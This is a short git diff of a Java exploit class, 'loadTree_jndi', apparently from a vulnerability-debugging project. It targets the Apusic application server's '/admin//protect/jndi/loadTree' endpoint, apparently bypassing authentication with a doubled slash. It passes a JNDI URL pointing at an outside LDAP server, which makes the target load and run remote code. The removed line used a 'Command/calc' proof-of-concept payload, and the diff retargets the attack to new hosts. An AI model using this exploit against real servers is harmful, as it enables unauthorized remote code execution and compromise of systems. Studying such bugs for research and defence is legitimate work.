@@ -1,6 +1,7 @@
 package apusic;
 
 import com.apusic.util.FileUtil;
+import com.apusic.web.container.ServletInvocation;
 import com.apusic.web.servlet.FileServlet;
 import com.apusic.web.servlet.InvokerServlet;
 import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
@@ -14,8 +15,8 @@ public class loadTree_jndi {
 
     public static void main(String[] args) throws IOException {
 
-        String url = "http://192.168.26.129:6888/admin//protect/jndi/loadTree";
-        String jndiUrl = "ldap://192.168.26.129:11389/Basic/Command/calc";
+        String url = "http://10.58.120.201:6888/admin//protect/jndi/loadTree";
+        String jndiUrl = "ldap://10.58.120.200:1389/qczdev";
 
         HttpRequest httpRequest = new HttpRequest("127.0.0.1",8080);
         HttpPost httpPost = new HttpPost(url);
